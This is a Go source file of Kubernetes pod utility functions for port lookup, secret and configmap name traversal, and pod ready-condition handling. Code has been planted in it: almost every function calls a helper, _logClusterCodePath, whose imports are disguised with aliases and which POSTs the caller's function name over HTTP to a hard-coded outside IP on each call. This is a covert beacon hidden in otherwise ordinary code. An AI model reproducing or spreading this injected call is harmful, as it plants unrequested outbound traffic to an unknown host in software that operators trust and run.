package pod

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "k8s.io/api/core/v1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/util/intstr"
)

func FindPort(pod *v1.Pod, svcPort *v1.ServicePort) (int, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 portName := svcPort.TargetPort
 switch portName.Type {
 case intstr.String:
  name := portName.StrVal
  for _, container := range pod.Spec.Containers {
   for _, port := range container.Ports {
    if port.Name == name && port.Protocol == svcPort.Protocol {
     return int(port.ContainerPort), nil
    }
   }
  }
 case intstr.Int:
  return portName.IntValue(), nil
 }
 return 0, fmt.Errorf("no suitable port for manifest: %s", pod.UID)
}

type Visitor func(name string) (shouldContinue bool)

func VisitPodSecretNames(pod *v1.Pod, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, reference := range pod.Spec.ImagePullSecrets {
  if !visitor(reference.Name) {
   return false
  }
 }
 for i := range pod.Spec.InitContainers {
  if !visitContainerSecretNames(&pod.Spec.InitContainers[i], visitor) {
   return false
  }
 }
 for i := range pod.Spec.Containers {
  if !visitContainerSecretNames(&pod.Spec.Containers[i], visitor) {
   return false
  }
 }
 var source *v1.VolumeSource
 for i := range pod.Spec.Volumes {
  source = &pod.Spec.Volumes[i].VolumeSource
  switch {
  case source.AzureFile != nil:
   if len(source.AzureFile.SecretName) > 0 && !visitor(source.AzureFile.SecretName) {
    return false
   }
  case source.CephFS != nil:
   if source.CephFS.SecretRef != nil && !visitor(source.CephFS.SecretRef.Name) {
    return false
   }
  case source.Cinder != nil:
   if source.Cinder.SecretRef != nil && !visitor(source.Cinder.SecretRef.Name) {
    return false
   }
  case source.FlexVolume != nil:
   if source.FlexVolume.SecretRef != nil && !visitor(source.FlexVolume.SecretRef.Name) {
    return false
   }
  case source.Projected != nil:
   for j := range source.Projected.Sources {
    if source.Projected.Sources[j].Secret != nil {
     if !visitor(source.Projected.Sources[j].Secret.Name) {
      return false
     }
    }
   }
  case source.RBD != nil:
   if source.RBD.SecretRef != nil && !visitor(source.RBD.SecretRef.Name) {
    return false
   }
  case source.Secret != nil:
   if !visitor(source.Secret.SecretName) {
    return false
   }
  case source.ScaleIO != nil:
   if source.ScaleIO.SecretRef != nil && !visitor(source.ScaleIO.SecretRef.Name) {
    return false
   }
  case source.ISCSI != nil:
   if source.ISCSI.SecretRef != nil && !visitor(source.ISCSI.SecretRef.Name) {
    return false
   }
  case source.StorageOS != nil:
   if source.StorageOS.SecretRef != nil && !visitor(source.StorageOS.SecretRef.Name) {
    return false
   }
  }
 }
 return true
}
func visitContainerSecretNames(container *v1.Container, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, env := range container.EnvFrom {
  if env.SecretRef != nil {
   if !visitor(env.SecretRef.Name) {
    return false
   }
  }
 }
 for _, envVar := range container.Env {
  if envVar.ValueFrom != nil && envVar.ValueFrom.SecretKeyRef != nil {
   if !visitor(envVar.ValueFrom.SecretKeyRef.Name) {
    return false
   }
  }
 }
 return true
}
func VisitPodConfigmapNames(pod *v1.Pod, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for i := range pod.Spec.InitContainers {
  if !visitContainerConfigmapNames(&pod.Spec.InitContainers[i], visitor) {
   return false
  }
 }
 for i := range pod.Spec.Containers {
  if !visitContainerConfigmapNames(&pod.Spec.Containers[i], visitor) {
   return false
  }
 }
 var source *v1.VolumeSource
 for i := range pod.Spec.Volumes {
  source = &pod.Spec.Volumes[i].VolumeSource
  switch {
  case source.Projected != nil:
   for j := range source.Projected.Sources {
    if source.Projected.Sources[j].ConfigMap != nil {
     if !visitor(source.Projected.Sources[j].ConfigMap.Name) {
      return false
     }
    }
   }
  case source.ConfigMap != nil:
   if !visitor(source.ConfigMap.Name) {
    return false
   }
  }
 }
 return true
}
func visitContainerConfigmapNames(container *v1.Container, visitor Visitor) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, env := range container.EnvFrom {
  if env.ConfigMapRef != nil {
   if !visitor(env.ConfigMapRef.Name) {
    return false
   }
  }
 }
 for _, envVar := range container.Env {
  if envVar.ValueFrom != nil && envVar.ValueFrom.ConfigMapKeyRef != nil {
   if !visitor(envVar.ValueFrom.ConfigMapKeyRef.Name) {
    return false
   }
  }
 }
 return true
}
func GetContainerStatus(statuses []v1.ContainerStatus, name string) (v1.ContainerStatus, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for i := range statuses {
  if statuses[i].Name == name {
   return statuses[i], true
  }
 }
 return v1.ContainerStatus{}, false
}
func GetExistingContainerStatus(statuses []v1.ContainerStatus, name string) v1.ContainerStatus {
 _logClusterCodePath()
 defer _logClusterCodePath()
 status, _ := GetContainerStatus(statuses, name)
 return status
}
func IsPodAvailable(pod *v1.Pod, minReadySeconds int32, now metav1.Time) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !IsPodReady(pod) {
  return false
 }
 c := GetPodReadyCondition(pod.Status)
 minReadySecondsDuration := time.Duration(minReadySeconds) * time.Second
 if minReadySeconds == 0 || !c.LastTransitionTime.IsZero() && c.LastTransitionTime.Add(minReadySecondsDuration).Before(now.Time) {
  return true
 }
 return false
}
func IsPodReady(pod *v1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return IsPodReadyConditionTrue(pod.Status)
}
func IsPodReadyConditionTrue(status v1.PodStatus) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 condition := GetPodReadyCondition(status)
 return condition != nil && condition.Status == v1.ConditionTrue
}
func GetPodReadyCondition(status v1.PodStatus) *v1.PodCondition {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, condition := GetPodCondition(&status, v1.PodReady)
 return condition
}
func GetPodCondition(status *v1.PodStatus, conditionType v1.PodConditionType) (int, *v1.PodCondition) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if status == nil {
  return -1, nil
 }
 return GetPodConditionFromList(status.Conditions, conditionType)
}
func GetPodConditionFromList(conditions []v1.PodCondition, conditionType v1.PodConditionType) (int, *v1.PodCondition) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if conditions == nil {
  return -1, nil
 }
 for i := range conditions {
  if conditions[i].Type == conditionType {
   return i, &conditions[i]
  }
 }
 return -1, nil
}
func UpdatePodCondition(status *v1.PodStatus, condition *v1.PodCondition) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 condition.LastTransitionTime = metav1.Now()
 conditionIndex, oldCondition := GetPodCondition(status, condition.Type)
 if oldCondition == nil {
  status.Conditions = append(status.Conditions, *condition)
  return true
 }
 if condition.Status == oldCondition.Status {
  condition.LastTransitionTime = oldCondition.LastTransitionTime
 }
 isEqual := condition.Status == oldCondition.Status && condition.Reason == oldCondition.Reason && condition.Message == oldCondition.Message && condition.LastProbeTime.Equal(&oldCondition.LastProbeTime) && condition.LastTransitionTime.Equal(&oldCondition.LastTransitionTime)
 status.Conditions[conditionIndex] = *condition
 return !isEqual
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
